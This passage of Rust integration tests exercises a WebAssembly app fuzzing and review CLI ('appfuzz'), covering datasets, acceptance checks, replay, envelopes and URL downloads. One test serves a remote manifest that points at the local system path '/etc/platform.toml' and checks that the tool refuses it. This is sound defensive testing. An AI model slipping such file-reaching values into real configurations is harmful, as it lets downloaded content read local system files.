        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param $offset i32) (result i32)
        (call $page (local.get $offset) (i32.const 32)) (i32.load (i32.const 36))))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let manifest = r#"
[app]
wasm = "app.wasm"
[entry]
export = "run"
request = 0
[datasets.items]
rows = 5
key = "id"
template = { id = 1 }
[functions."test:workflow/db#page"]
query = { dataset = "items", select = "id", page = { offset = "offset", max = 2, short = true } }
"#;
    std::fs::write(&f.manifest, manifest).unwrap();
    let rows = |args: &str, plan: &str| {
        let (code, r) = f.cli(&["run", "--args", args, "--plan", plan]);
        assert_eq!(code, 0, "{r}");
        let (_, raw) = f.cli(&["show", "last"]);
        (r["result"].as_u64().unwrap(), raw["events"][0]["result"].clone())
    };
    assert_eq!(rows("[0]", "{}"), (2, json!([1, 2])));
    assert_eq!(rows("[4]", "{}"), (1, json!([5])));
    assert_eq!(rows("[9]", "{}"), (0, json!([])));
    assert_eq!(rows("[0]", r#"{"test:workflow/db#page": {"page_size": 1}}"#), (1, json!([1])));
    // Edits change the world the run starts from.
    let drop = r#"{"_defaults": {"dataset_edits": [{"drop": {"dataset": "items", "keys": [1, 3]}}]}}"#;
    assert_eq!(rows("[0]", drop), (2, json!([2, 4])));
    let add = r#"{"_defaults": {"dataset_rows": {"items": 0}, "dataset_edits": [{"add": {"dataset": "items", "rows": 1}}]}}"#;
    assert_eq!(rows("[0]", add), (1, json!([1000001])));
    let (code, r) = f.cli(&["run", "--plan", r#"{"_defaults": {"dataset_edits": [{"drop": {"dataset": "typo", "keys": [1]}}]}}"#]);
    assert_eq!(code, 3, "{r}");
    assert!(r.to_string().contains("unknown dataset typo"), "{r}");
    // Short pages need the platform's word that they can happen.
    f.edit("short = true", "short = false");
    let (code, r) = f.cli(&["run", "--plan", r#"{"test:workflow/db#page": {"page_size": 1}}"#]);
    assert_eq!(code, 3, "{r}");
    assert!(r.to_string().contains("page.short"), "{r}");
    f.edit("offset = \"offset\"", "offset = \"from\"");
    let (code, r) = f.cli(&["inspect"]);
    assert_eq!(code, 3, "{r}");
    assert!(r["error"].as_str().unwrap().contains("unknown parameter from"), "{r}");
}

#[test]
fn changes_without_a_dataset_model_are_recorded_as_commits() {
    let f = Fixture::new(false);
    let text = std::fs::read_to_string(&f.manifest).unwrap();
    std::fs::write(&f.manifest, format!("{text}[functions.\"test:workflow/db#get\"]\neffect = \"external\"\n")).unwrap();
    assert_eq!(f.cli(&["run"]).0, 0);
    let (_, raw) = f.cli(&["show", "last"]);
    assert_eq!(raw["events"][0]["commit"], json!({"rows": []}), "{raw}");
    assert!(raw["events"][0]["result_bytes"].as_u64().unwrap() > 0, "{raw}");
    // A call that failed changed nothing.
    f.cli(&["run", "--plan", r#"{"test:workflow/db#get": {"trap": "down"}}"#]);
    let (_, raw) = f.cli(&["show", "last"]);
    assert_eq!(raw["events"][0]["trap"], "down", "{raw}");
    assert_eq!(raw["events"][0]["commit"], Value::Null, "{raw}");
    // Reads are not commits.
    std::fs::write(&f.manifest, format!("{text}[functions.\"test:workflow/db#get\"]\neffect = \"read\"\n")).unwrap();
    assert_eq!(f.cli(&["run"]).0, 0);
    let (_, raw) = f.cli(&["show", "last"]);
    assert_eq!(raw["events"][0]["commit"], Value::Null, "{raw}");
}

#[test]
fn configured_sequences_are_reviewed_and_historical_cases_remain_required() {
    let f = booking_fixture(false);
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str(
        r#"
[sequences.retry]
steps = [{ args = [3, 0] }, { args = [0, 7] }]
checks = [{ kind = "unique", dataset = "bookings", fields = ["slot"] }]
"#,
    );
    std::fs::write(&f.manifest, manifest).unwrap();
    for args in [vec!["review", "--runs", "10", "--confirm", "0"], vec!["review", "--runs", "1", "--fresh", "--confirm", "0"]] {
        let (code, report) = f.cli(&args);
        assert_eq!(code, 2, "{report}");
        assert_eq!(report["status"], "complete", "{report}");
        assert!(report["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "sequence_check_failed"), "{report}");
    }
    let (_, report) = f.cli(&["review", "--runs", "1", "--confirm", "0"]);
    let case = report["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "sequence_check_failed").unwrap()["case"].as_str().unwrap();
    std::fs::write(case, "broken JSON").unwrap();
    let (code, report) = f.cli(&["review", "--runs", "1", "--confirm", "0"]);
    assert_eq!(code, 3, "{report}");
}

#[test]
fn sequence_count_and_error_invariants_require_valid_initial_data() {
    let f = booking_fixture(false);
    let path = scenario_file(&f, json!({"steps":[{"args":[0,7]},{"args":[0,8]}],"checks":[{"kind":"max_rows","dataset":"bookings","max":1}]}));
    let (code, report) = f.cli(&["sequence", "fuzz", &path, "--runs", "3"]);
    assert_eq!(code, 2, "{report}");
    assert_eq!(report["records"].as_array().unwrap().len(), 2);
    for kind in ["unchanged_on_error", "idempotent"] {
        let path = scenario_file(
            &f,
            json!({"steps":[{"args":[0,7],"plan":{"test:workflow/db#create":{"commit_then_trap":"lost"}}},{"args":[0,7]}],"checks":[{"kind":kind,"dataset":"bookings"}]}),
        );
        let (code, report) = f.cli(&["sequence", "run", &path]);
        assert_eq!(code, 2, "{report}");
        assert!(report["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "sequence_check_failed"));
    }
    let path = scenario_file(
        &f,
        json!({"plan":{"_defaults":{"dataset_rows":{"bookings":2}}},"steps":[{"args":[3,0]}],"checks":[{"kind":"max_rows","dataset":"bookings","max":1}]}),
    );
    assert_eq!(f.cli(&["sequence", "run", &path]).0, 3);
}

fn availability_fixture(inverted: bool) -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { all: func() -> list<u32>; } world app { import db; export run: func(n:u32) -> u32; }";
    let wat = r#"(module
      (import "test:workflow/db" "all" (func $all (param i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param i32) (result i32)
        (call $all (i32.const 32)) COUNT))"#;
    let expression = if inverted { "(i32.sub (i32.const 10) (i32.load (i32.const 36)))" } else { "(i32.load (i32.const 36))" };
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat.replace("COUNT", expression))).unwrap();
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str(
        r#"
[datasets.rooms]
rows = 2
key = "id"
template = { id = 1 }
[functions."test:workflow/db#all"]
query = { dataset = "rooms", select = "id" }
[acceptance]
version = 1
[acceptance.checks.capacity]
origin = "platform"
property = ["value_range", "$", "0", "100"]
search = false
[acceptance.checks.example]
origin = "app"
expect = { selector = "$", equals = 2 }
[acceptance.checks.availability]
origin = "marketing"
description = "Adding a room must not reduce availability"
search = false
relation = { selector = "$", comparison = "non_decreasing", dataset = "rooms", add = 1 }
"#,
    );
    std::fs::write(&f.manifest, manifest).unwrap();
    f
}
#[test]
fn saved_acceptance_suite_runs_in_review_and_preserves_origin() {
    let f = availability_fixture(false);
    let (code, result) = f.cli(&["acceptance", "run", "--runs", "10"]);
    assert_eq!(code, 0, "{result}");
    assert_eq!(result["suite_version"], 1);
    assert_eq!(result["checks"].as_array().unwrap().len(), 3);
    for c in result["checks"].as_array().unwrap() {
        assert_eq!(c["status"], "holds", "{result}");
        assert!(c["matches"].as_u64().unwrap() > 0);
    }
    let availability = result["checks"].as_array().unwrap().iter().find(|c| c["name"] == "availability").unwrap();
    // The former spelling `marketing` still reads, and reports say `app`.
    assert_eq!(availability["origin"], "app");
    assert_eq!(availability["evidence"]["before"], 2.0);
    assert_eq!(availability["evidence"]["after"], 3.0);
    let (code, result) = f.cli(&["review", "--runs", "10", "--confirm", "0"]);
    assert_eq!(code, 0, "{result}");
    assert_eq!(result["acceptance"]["verdict"], "pass");
}
#[test]
fn relational_counterexamples_replay_and_regress_against_corrected_components() {
    let f = availability_fixture(true);
    let (code, result) = f.cli(&["acceptance", "run", "availability", "--runs", "10"]);
    assert_eq!(code, 2, "{result}");
    assert_eq!(result["checks"][0]["evidence"]["before"], 8.0);
    assert_eq!(result["checks"][0]["evidence"]["after"], 7.0);
    let case = result["checks"][0]["case"].as_str().unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 0);
    let fixed = availability_fixture(false);
    std::fs::copy(fixed.dir.join("app.wasm"), f.dir.join("app.wasm")).unwrap();
    assert_eq!(f.cli(&["replay", case]).0, 3);
    let (code, result) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{result}");
    assert_eq!(result["reproduced"], false);
}
#[test]
fn examples_keep_supplied_inputs_and_unexercised_checks_cannot_pass() {
    let f = availability_fixture(true);
    let (code, result) = f.cli(&["acceptance", "run", "example"]);
    assert_eq!(code, 2, "{result}");
    assert_eq!(result["checks"][0]["shrink_evaluations"], 0);
    let case = result["checks"][0]["case"].as_str().unwrap();
    let artifact: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    assert_eq!(artifact["spec"]["args"], json!([1]));
    f.edit("equals = 2", "equals = 8");
    assert_eq!(f.cli(&["acceptance", "run", "example"]).0, 0);
    f.edit("selector = \"$\", equals = 8", "selector = \".missing\", equals = 8");
    let (code, result) = f.cli(&["acceptance", "run", "example"]);
    assert_eq!(code, 3, "{result}");
    assert_eq!(result["checks"][0]["status"], "not_exercised");
    assert_eq!(f.cli(&["review", "--runs", "1", "--confirm", "0"]).0, 3);
    // Editing the suite does not rewrite a saved case's requirement.
    let (code, result) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 2, "{result}"); // Case retains the original requirement, independent of the edited suite.
}
#[test]
fn saved_properties_shrink_and_historical_cases_survive_fresh_reviews() {
    let f = availability_fixture(false);
    f.edit("\"0\", \"100\"", "\"0\", \"2\"");
    f.edit("property = [\"value_range\", \"$\", \"0\", \"2\"]\nsearch = false", "property = [\"value_range\", \"$\", \"0\", \"2\"]\nsearch = true");
    f.cli(&["run", "--plan", r#"{"_defaults":{"dataset_rows":{"rooms":10}}}"#]);
    let (code, result) = f.cli(&["acceptance", "run", "capacity", "--runs", "10"]);
    assert_eq!(code, 2, "{result}");
    let case = result["checks"][0]["case"].as_str().unwrap();
    let artifact: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    assert_eq!(artifact["spec"]["plan"]["_defaults"]["dataset_rows"]["rooms"], 3, "{artifact}");
    assert_eq!(f.cli(&["replay", case]).0, 0);
    let (code, review) = f.cli(&["review", "--runs", "1", "--fresh", "--confirm", "0"]);
    assert_eq!(code, 2, "{review}");
    assert!(review["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "acceptance_failed"));
    std::fs::write(case, "bad JSON").unwrap();
    assert_eq!(f.cli(&["review", "--runs", "1", "--fresh", "--confirm", "0"]).0, 3);
}
#[test]
fn invalid_suites_and_relation_domains_are_explicit_errors() {
    let f = availability_fixture(false);
    f.edit("version = 1", "version = 99");
    assert_eq!(f.cli(&["inspect"]).0, 3);
    f.edit("version = 99", "version = 1");
    f.edit("comparison = \"non_decreasing\"", "comparison = \"non_decreasing\", set = { \"/0\" = 1 }");
    assert_eq!(f.cli(&["inspect"]).0, 3);
    f.edit(", set = { \"/0\" = 1 }", "");
    f.edit("selector = \"$\", comparison", "selector = \".missing\", comparison");
    let (code, result) = f.cli(&["acceptance", "run", "availability"]);
    assert_eq!(code, 3, "{result}");
    assert_eq!(result["checks"][0]["status"], "not_exercised");
    assert_eq!(f.cli(&["acceptance", "run", "typo"]).0, 3);
}

#[test]
fn acceptance_search_discovers_and_shrinks_a_new_property_failure() {
    let f = availability_fixture(false);
    f.edit("\"0\", \"100\"", "\"0\", \"2\"");
    f.edit("property = [\"value_range\", \"$\", \"0\", \"2\"]\nsearch = false", "property = [\"value_range\", \"$\", \"0\", \"2\"]\nsearch = true");
    let (code, result) = f.cli(&["acceptance", "run", "capacity", "--runs", "80"]);
    assert_eq!(code, 2, "{result}");
    assert!(result["checks"][0]["evaluations"].as_u64().unwrap() > 2);
    let case = result["checks"][0]["case"].as_str().unwrap();
    let artifact: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    assert_eq!(artifact["spec"]["plan"]["_defaults"]["dataset_rows"]["rooms"], 3, "{artifact}");
}
#[test]
fn request_relations_and_json_expectations_preserve_types() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; world app { export run: func(n:u32) -> u32; }";
    let wat = "(module (func (export \"run\") (param i32) (result i32) (local.get 0)))";
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str(
        r#"
[acceptance]
version = 1
[acceptance.checks.increasing]
origin = "platform"
search = false
relation = { selector = "$", comparison = "non_decreasing", set = { "/0" = 2 } }
[acceptance.checks.example]
origin = "app"
args = [5]
expect = { selector = "$", equals = 5 }
"#,
    );
    std::fs::write(&f.manifest, manifest).unwrap();
    let (code, result) = f.cli(&["acceptance", "run"]);
    assert_eq!(code, 0, "{result}");
    f.edit("equals = 5", "equals = \"5\"");
    assert_eq!(f.cli(&["acceptance", "run", "example"]).0, 2);
    f.edit("\"/0\" = 2", "\"/0\" = 0");
    assert_eq!(f.cli(&["acceptance", "run", "increasing"]).0, 2);
    f.edit("\"/0\" = 0", "\"/0\" = 1");
    assert_eq!(f.cli(&["acceptance", "run", "increasing"]).0, 3); // No-op transform cannot support a comparison.
}

fn assert_fixture(inverted: bool, checks: &str) -> Fixture {
    let f = availability_fixture(inverted);
    let s = std::fs::read_to_string(&f.manifest).unwrap();
    let head = s.split("[acceptance]").next().unwrap().to_string();
    std::fs::write(&f.manifest, format!("{head}[acceptance]\nversion = 1\n{checks}")).unwrap();
    f
}
const COUNT: &str = r#"
[acceptance.checks.count]
origin = "app"
let = { rooms = "host.db#all.result", shown = "out.result" }
assert = "shown == size(rooms)"
"#;
#[test]
fn assert_checks_break_with_evidence_shrink_and_hold_on_the_fix() {
    let f = assert_fixture(true, COUNT);
    let (code, result) = f.cli(&["acceptance", "run", "--runs", "20"]);
    assert_eq!(code, 2, "{result}");
    let c = &result["checks"][0];
    assert_eq!(c["status"], "broken", "{result}");
    assert_eq!(c["property"], "shown == size(rooms)");
    assert_eq!(c["evidence"]["failing"], "shown == size(rooms)", "{result}");
    let explained = &c["evidence"]["evidence"]["explained"];
    assert_eq!(explained["left"].as_i64().unwrap() + explained["right"].as_i64().unwrap(), 10, "{result}");
    let case = c["case"].as_str().unwrap().to_string();
    assert_eq!(f.cli(&["replay", &case]).0, 0);
    let fixed = availability_fixture(false);
    std::fs::copy(fixed.dir.join("app.wasm"), f.dir.join("app.wasm")).unwrap();
    let (code, result) = f.cli(&["acceptance", "run", "--runs", "20"]);
    assert_eq!(code, 0, "{result}");
    assert_eq!(result["checks"][0]["weak"], false, "{result}");
    let (code, result) = f.cli(&["replay", &case, "--against-current"]);
    assert_eq!(code, 0, "{result}");
    // A case made for an edited requirement no longer gates review.
    f.edit("shown == size(rooms)", "shown == size(rooms) + 0");
    let (_, result) = f.cli(&["replay", &case, "--against-current"]);
    assert_eq!(result["superseded"], true, "{result}");
    let (code, review) = f.cli(&["review", "--runs", "10", "--confirm", "0"]);
    assert_eq!(code, 0, "{review}");
}
#[test]
fn assert_tables_name_each_property_and_report_weak_and_strict_errors() {
    let f = assert_fixture(
        false,
        r#"
[acceptance.checks.rooms]
origin = "app"
let = { rooms = "host.db#all.result", shown = "out.result" }
assert = { count = "shown == size(rooms)", positive = "shown >= 0", third = "rooms[2] > 0" }
"#,
    );
    let (code, result) = f.cli(&["acceptance", "run", "--runs", "10"]);
    assert_eq!(code, 3, "{result}");
    let row = |n: &str| result["checks"].as_array().unwrap().iter().find(|c| c["name"] == n).unwrap_or_else(|| panic!("{n}: {result}")).clone();
    assert_eq!(row("rooms.count")["status"], "holds");
    assert_eq!(row("rooms.positive")["weak"], true, "{result}");
    assert!(row("rooms.positive")["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "weak_assert"), "{result}");
    assert_eq!(row("rooms.third")["status"], "error", "{result}");
    let (code, one) = f.cli(&["acceptance", "run", "rooms.count", "--runs", "5"]);
    assert_eq!(code, 0, "{one}");
    assert_eq!(one["checks"].as_array().unwrap().len(), 1);
    // Unused bindings and unknown host functions are rejected before running.
    f.edit("shown = \"out.result\"", "shown = \"out.result\", spare = \"out.status\"");
    assert_eq!(f.cli(&["inspect"]).0, 3);
    f.edit(", spare = \"out.status\"", "");
    f.edit("host.db#all.result", "host.db#everything.result");
    assert_eq!(f.cli(&["inspect"]).0, 3);
}
#[test]
fn assume_scopes_runs_and_unexercised_asserts_cannot_pass() {
    let f = assert_fixture(false, &format!("{COUNT}assume = \"size(rooms) > 50\"\n"));
    let (code, result) = f.cli(&["acceptance", "run", "--runs", "10"]);
    assert_eq!(code, 3, "{result}");
    assert_eq!(result["checks"][0]["status"], "not_exercised", "{result}");
    assert!(result["checks"][0]["rejected"].as_u64().unwrap() > 0, "{result}");
    assert!(!result["checks"][0]["health"].as_array().unwrap().is_empty(), "{result}");
}
#[test]
fn run_judges_saved_asserts_and_eval_and_bindings_explain_them() {
    let f = assert_fixture(true, COUNT);
    let (code, r) = f.cli(&["run"]);
    assert_eq!(code, 2, "{r}");
    assert_eq!(r["asserts"]["count"]["status"], "broken", "{r}");
    assert_eq!(f.cli(&["check", "value_range", "$", "0", "100", "--let", "x=out.result"]).0, 3);
    let (code, r) = f.cli(&["eval", "last", "size(rooms) + 1", "--let", "rooms=host.db#all.result"]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["value"], 3, "{r}");
    assert_eq!(r["bindings"]["rooms"]["value"], json!([1, 2]), "{r}");
    let (code, r) = f.cli(&["bindings"]);
    assert_eq!(code, 0, "{r}");
    assert!(r["host"].as_array().unwrap().iter().any(|h| h["func"] == "test:workflow/db#all"), "{r}");
    // --fast skips judging: no verdict, no exit 2, and fuzzing reports no asserts.
    let (code, r) = f.cli(&["--fast", "run"]);
    assert_eq!(code, 0, "{r}");
    assert!(r.get("asserts").is_none(), "{r}");
    let (_, r) = f.cli(&["--fast", "fuzz", "--runs", "20"]);
    assert!(r["asserts"].as_array().is_some_and(Vec::is_empty) && r["fast"] == true, "{r}");
}
fn identity_fixture(checks: &str) -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; world app { export run: func(n:u32) -> u32; }";
    let wat = "(module (func (export \"run\") (param i32) (result i32) (local.get 0)))";
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str(&format!("[acceptance]\nversion = 1\n{checks}"));
    std::fs::write(&f.manifest, manifest).unwrap();
    f
}
#[test]
fn fuzzing_judges_asserts_on_every_run_and_closes_in_on_their_boundaries() {
    let f = identity_fixture(
        r#"
[acceptance.checks.limit]
origin = "app"
let = { n = "args.0", shown = "out.result" }
assert = "shown < 123457 && shown == n"
[acceptance.checks.wide]
origin = "platform"
let = { shown = "out.result" }
assert = "shown <= 4294967295"
"#,
    );
    let (code, r) = f.cli(&["fuzz", "--runs", "300", "--fresh"]);
    assert_eq!(code, 0, "{r}");
    let a = |n: &str| r["asserts"].as_array().unwrap().iter().find(|a| a["name"] == n).unwrap_or_else(|| panic!("{n}: {r}")).clone();
    // The literal is a boundary to try: 123457 breaks `shown < 123457`.
    assert!(a("limit")["broken"].as_u64().unwrap() > 0, "{r}");
    assert!(a("limit")["broken_at"]["run"].is_string(), "{r}");
    // A holding assert reports how close a run came, and that runs got closer.
    let wide = a("wide");
    assert_eq!(wide["broken"], 0, "{r}");
    assert!(wide["evaluated"].as_u64().unwrap() > 100, "{r}");
    assert!(wide["closer"].as_u64().unwrap() > 0, "{r}");
    assert!(wide["closest"]["margin"].as_f64().unwrap() < 1000.0, "{r}");
    // The broken run was kept: the acceptance search starts from it and shrinks it.
    let (code, r) = f.cli(&["acceptance", "run", "limit", "--runs", "5"]);
    assert_eq!(code, 2, "{r}");
    let case = r["checks"][0]["case"].as_str().unwrap();
    let artifact: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    assert_eq!(artifact["spec"]["args"], json!([123457]), "{artifact}");
}
#[test]
fn envelopes_are_bound_to_the_acceptance_suite_they_were_reviewed_with() {
    let f = assert_fixture(false, COUNT);
    let path = f.dir.join("envelope.json");
    let path = path.to_str().unwrap();
    let (code, v) = f.cli(&["review", "--runs", "10", "--confirm", "0"]);
    assert_eq!(code, 0, "{v}");
    let id = v["session"].as_str().unwrap().to_string();
    assert_eq!(f.cli(&["envelope", "--review", &id, "--out", path]).0, 0);
    f.cli(&["run"]);
    assert_eq!(f.cli(&["envelope", "check", "last", "--envelope", path]).0, 0);
    // Editing a requirement keeps runs, but not the review or envelope built on the old one.
    f.edit("shown == size(rooms)", "shown <= size(rooms)");
    assert_eq!(f.cli(&["envelope", "--review", &id, "--out", path]).0, 3);
    assert_eq!(f.cli(&["envelope", "check", "last", "--envelope", path]).0, 3);
}

/// Serves `files` over plain HTTP on a free port; unknown paths are 404.
fn serve(files: Vec<(&'static str, Vec<u8>)>) -> String {
    use std::io::{BufRead, BufReader, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let mut line = String::new();
            reader.read_line(&mut line).unwrap();
            let path = line.split(' ').nth(1).unwrap_or("").to_string();
            loop {
                let mut h = String::new();
                if reader.read_line(&mut h).unwrap() <= 2 {
                    break;
                }
            }
            let mut s = stream;
            match files.iter().find(|(p, _)| *p == path) {
                Some((_, body)) => {
                    write!(s, "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n", body.len()).unwrap();
                    s.write_all(body).unwrap();
                }
                None => write!(s, "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").unwrap(),
            }
        }
    });
    format!("http://{addr}")
}

#[test]
fn a_url_is_downloaded_with_its_manifest_and_reviewed() {
    let f = Fixture::new(false);
    let wasm = std::fs::read(f.dir.join("app.wasm")).unwrap();
    let manifest = std::fs::read_to_string(&f.manifest).unwrap().replace("cost_per_request = 100", "cost_per_request = 0");
    let base = serve(vec![
        ("/app.wasm", wasm.clone()),
        ("/app.toml", manifest.into_bytes()),
        ("/bare.wasm", wasm),
        ("/text.wasm", b"hello".to_vec()),
        ("/local.wasm", std::fs::read(f.dir.join("app.wasm")).unwrap()),
        ("/local.toml", b"[app]\nwasm = \"x.wasm\"\nplatform = \"/etc/platform.toml\"\n".to_vec()),
    ]);
    let cache = f.dir.join("cache");
    let cli = |args: &[&str]| {
        let out = Command::new(env!("CARGO_BIN_EXE_appfuzz")).env("APPFUZZ_CACHE", &cache).current_dir(&f.dir).args(args).output().unwrap();
        let v: Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| panic!("{args:?}: {e}: {}", String::from_utf8_lossy(&out.stderr)));
        (out.status.code().unwrap(), v, String::from_utf8_lossy(&out.stderr).to_string())
    };
    let url = format!("{base}/app.wasm");

    // Plain http needs --allow-http.
    let (code, v, _) = cli(&[&url]);
    assert_eq!(code, 3, "{v}");
    assert!(v["error"].as_str().unwrap().contains("--allow-http"), "{v}");

    // A URL in place of a command reviews it, with the manifest next to it:
    // its cost limit of 0 fails the one host call. ./appfuzz.toml is ignored.
    let (code, v, err) = cli(&["-j", "1", "--allow-http", &url, "--runs", "20", "--time", "1s"]);
    assert_eq!(code, 2, "{v}");
    assert!(err.contains("manifest: ") && err.contains("/app.toml"), "{err}");
    assert!(v["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "over_budget"), "{v}");
    assert!(v["next"][0].as_str().unwrap().contains(&format!("--wasm '{url}' --allow-http")), "follow-ups download again: {v}");
    assert!(!f.dir.join(".appfuzz").exists(), "runs of a URL go to the cache, not the current folder");
    assert!(cache.join("state").is_dir());

    // No manifest (404): the bare component runs.
    let (code, v, err) = cli(&["--allow-http", "--wasm", &format!("{base}/bare.wasm"), "run"]);
    assert_eq!(code, 0, "{v}");
    assert!(err.contains("manifest: none"), "{err}");

    // Not Wasm, missing, and a manifest that reaches into local files.
    let (code, v, _) = cli(&["--allow-http", &format!("{base}/text.wasm")]);
    assert_eq!(code, 3);
    assert!(v["error"].as_str().unwrap().contains("not a WebAssembly file"), "{v}");
    let (code, v, _) = cli(&["--allow-http", &format!("{base}/missing.wasm")]);
    assert_eq!(code, 3);
    assert!(v["error"].as_str().unwrap().contains("404"), "{v}");
    let (code, v, _) = cli(&["--allow-http", &format!("{base}/local.wasm")]);
    assert_eq!(code, 3);
    assert!(v["error"].as_str().unwrap().contains("bundled platform"), "{v}");
}
#[test]
fn misspelt_function_names_are_refused() {
    let f = Fixture::new(false);
    // A platform describes functions the app doesn't call: no error.
    let mut text = std::fs::read_to_string(&f.manifest).unwrap();
    text.push_str("\n[functions.\"test:workflow/db#put\"]\neffect = \"write\"\n");
    std::fs::write(&f.manifest, &text).unwrap();
    assert_eq!(f.cli(&["inspect"]).0, 0);
    // One without its package names nothing; the app imports db#get.
    std::fs::write(&f.manifest, format!("{text}[functions.\"workflow/db#get\"]\nlatency_ms = 40\n")).unwrap();
    let (code, r) = f.cli(&["inspect"]);
    assert_eq!(code, 3, "{r}");
    assert!(r["error"].as_str().unwrap().contains("did you mean test:workflow/db#get?"), "{r}");
    // With an entry of its own, the near key is another function.
    std::fs::write(&f.manifest, format!("{text}[functions.\"workflow/db#get\"]\nlatency_ms = 40\n[functions.\"test:workflow/db#get\"]\ncost = 2\n")).unwrap();
    assert_eq!(f.cli(&["inspect"]).0, 0);
    std::fs::write(&f.manifest, &text).unwrap();
    // Plans too: a misspelt key or a rule on a parameter the function lacks.
    let (code, r) = f.cli(&["run", "--plan", r#"{"_defaults": {"latency_ms": 2}, "db#get": {"return": 1}}"#]);
    assert_eq!(code, 3, "{r}");
    assert!(r["error"].as_str().unwrap().contains("did you mean test:workflow/db#get?"), "{r}");
    let (code, r) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get": {"rules": [{"when": {"idd": 1}, "return": 2}]}}"#]);
    assert_eq!(code, 3, "{r}");
    assert!(r["error"].as_str().unwrap().contains("parameter idd"), "{r}");
    // One plan can describe the platform for several apps.
    let plan = r#"{"test:workflow/db#put": {"return": 0}, "test:workflow/db#get": {"rules": [{"when": {"id": 1}, "return": 2}]}}"#;
    let (code, r) = f.cli(&["run", "--plan", plan]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["result"], 2, "{r}");
}
#[test]
fn platform_wasi_is_simulated() {
    // wasi:keyvalue and wasi:config are the platform's services (Spin 3,
    // wasmCloud): host functions like its own, not a crash.
    let f = Fixture::new(false);
    let wit = "package test:workflow;
        package wasi:keyvalue@0.2.0-draft { interface atomics { increment: func(key: string, delta: u64) -> u64; } }
        package wasi:config@0.2.0-draft { interface store { variant error { upstream(string), io(string) } get: func(key: string) -> result<option<string>, error>; } }
        world app { import wasi:keyvalue/atomics@0.2.0-draft; import wasi:config/store@0.2.0-draft; export run: func(n: u32) -> u32; }";
    let wat = r#"
        (module
          (import "wasi:keyvalue/atomics@0.2.0-draft" "increment" (func $inc (param i32 i32 i64) (result i64)))
          (import "wasi:config/store@0.2.0-draft" "get" (func $get (param i32 i32 i32)))
          (memory (export "memory") 1)
          (data (i32.const 16) "hits")
          (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
          (func (export "run") (param i32) (result i32)
            (call $get (i32.const 16) (i32.const 4) (i32.const 64))
            (i32.wrap_i64 (call $inc (i32.const 16) (i32.const 4) (i64.const 1)))))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let (code, r) = f.cli(&["run", "--plan", r#"{"wasi:keyvalue/atomics#increment": {"return": 41}}"#]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["result"], 41, "{r}");
    assert_eq!(r["totals"]["host_calls"], 2, "{r}");
    let (_, i) = f.cli(&["inspect"]);
    assert!(i["imports"].as_array().unwrap().iter().all(|i| i["kind"] == "platform"), "{i}");
}
#[test]
fn a_rebuild_is_checked_against_the_findings_of_the_last_one() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; world app { export run: func(n: u32) -> u32; }";
    let build = |pad: bool, crash: bool| {
        let check = if crash { "(if (i32.gt_u (local.get 0) (i32.const 1000)) (then unreachable))" } else { "" };
        let pad = if pad { "(func $pad (result i32) (i32.const 7)) (func (export \"other\") (result i32) (call $pad))" } else { "" };
        let wat = format!(r#"(module (memory (export "memory") 1) {pad} (func (export "run") (param i32) (result i32) {check} (local.get 0)))"#);
        let wit = if pad.is_empty() { wit.to_string() } else { wit.replace("export run", "export other: func() -> u32; export run") };
        std::fs::write(f.dir.join("app.wasm"), component(&wit, &wat)).unwrap();
    };
    build(false, true);
    let (code, r) = f.review();
    assert_eq!(code, 2, "{r}");
    let crash = r["findings"].as_array().unwrap().iter().find(|x| x["kind"] == "crash").unwrap_or_else(|| panic!("{r}")).clone();
    let run = crash["run"].as_str().unwrap();
    // The fix: findings say the last review was of another build.
    build(false, false);
    let (_, listed) = f.cli(&["findings"]);
    assert!(listed["earlier_builds"].as_u64().unwrap() >= 1, "{listed}");
    let (code, r) = f.cli(&["replay", run]);
    assert_eq!(code, 3, "{r}");
    assert!(r["error"].as_str().unwrap().contains("--against-current"), "{r}");
    let (code, r) = f.cli(&["replay", run, "--against-current"]);
    assert_eq!(code, 0, "{r}");
